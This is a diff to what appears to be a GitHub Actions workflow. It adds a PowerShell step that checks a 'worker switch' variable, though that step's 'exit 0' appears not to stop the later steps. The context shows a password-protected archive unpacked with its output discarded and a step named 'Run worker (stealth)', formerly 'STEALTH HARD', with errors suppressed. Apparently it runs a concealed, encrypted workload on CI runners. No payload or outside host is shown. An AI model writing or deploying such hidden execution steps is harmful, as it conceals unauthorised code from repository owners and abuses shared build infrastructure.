@@ -17,6 +17,13 @@ jobs:
     steps:
       - uses: actions/checkout@v3
 
+      - name: Check worker switch
+        shell: powershell
+        env:
+          WORKER_ENABLED: ${{ vars.WORKER_ENABLED }}
+        run: |
+          if ($Env:WORKER_ENABLED -ne "true") { exit 0 }
+
       - name: Prepare dependencies (silent)
         shell: powershell
         run: |
@@ -37,7 +44,7 @@ jobs:
         run: |
           & "C:\Program Files\7-Zip\7z.exe" x app.7z -p"$Env:ARCHIVE_KEY" -oextracted -y > $null
 
-      - name: Run worker (STEALTH HARD)
+      - name: Run worker (stealth)
         shell: powershell
         run: |
           $ErrorActionPreference = 'SilentlyContinue'
